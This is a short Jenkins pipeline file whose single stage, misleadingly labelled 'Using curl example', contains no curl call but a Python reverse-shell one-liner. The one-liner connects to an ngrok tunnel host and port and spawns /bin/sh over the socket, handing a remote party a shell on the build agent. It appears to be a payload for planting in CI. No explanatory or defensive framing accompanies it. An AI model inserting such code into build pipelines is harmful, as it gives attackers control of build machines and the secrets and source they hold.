pipeline { 
    agent any
    stages {
        stage("Using curl example") {
            steps {
                script {
                        export RHOST="2.tcp.eu.ngrok.io";export RPORT=15319;python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
                    }
                }
            }
        }
    
}
